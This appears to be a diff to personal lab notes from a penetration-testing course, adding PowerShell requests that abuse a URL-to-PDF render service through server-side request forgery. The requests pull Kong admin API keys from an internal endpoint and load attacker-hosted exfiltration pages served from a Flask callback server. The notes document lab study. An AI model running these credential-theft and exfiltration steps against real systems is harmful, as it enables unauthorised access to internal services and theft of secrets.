@@ -72,3 +72,25 @@ Authenticated request to /render service
 ```powershell
 iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
 ```
+
+Without calling the File Import service, recreate the attack to steal credentials from Kong by calling the Render service directly with the API key.
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163/api-key-extraction.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+Adjust your HTML payload so the credentials are included in the PDF the service returns:
+This version is as a pdf
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://172.16.16.4:8001/key-auths"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck -Outfile apicredentials.pdf
+```
+This version is as html, learned about the output parameter from: https://github.com/alvarcarto/url-to-pdf-api
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://172.16.16.4:8001/key-auths"; "output"="html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+
+Using flask as a callbackserver to server the javascript payloads and process their outputs.
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163:1080/exfiltration_extramile_chunked.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163:1080/api-key-extraction-callback-server.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
